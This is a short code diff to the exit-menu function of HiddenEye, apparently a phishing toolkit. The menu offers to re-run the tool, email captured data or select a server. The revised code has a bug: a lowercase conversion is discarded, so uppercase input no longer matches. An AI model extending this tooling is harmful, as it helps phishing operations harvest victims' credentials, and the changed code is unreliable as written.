@@ -7,12 +7,12 @@ import Defs.LocalizationManager.lang_global_usage as global_localization
 
 default_palette = theme.default_palette
 
-def exit_message(port):  # Message when HiddenEye exit
-    choice = input(
-        "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M) : SelectServer(S)\n\n >> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
-    if choice == 'R' or choice == 'r':
-        run_command('sudo python3 HiddenEye.py')
-    elif choice == 'M' or choice == 'm':
+def exit_message(port = 80):  # Message when HiddenEye exit
+    choice = input(localization.lang_exit_message["choice"])
+    choice.lower()
+    if choice == 'r':
+        run_command(['sudo', 'python3', 'HiddenEye.py'])
+    elif choice ==  'm':
         email_prompt.captured_data_email_confirmation(port)
     elif choice ==  's':
     	server_menu.server_selection(port)
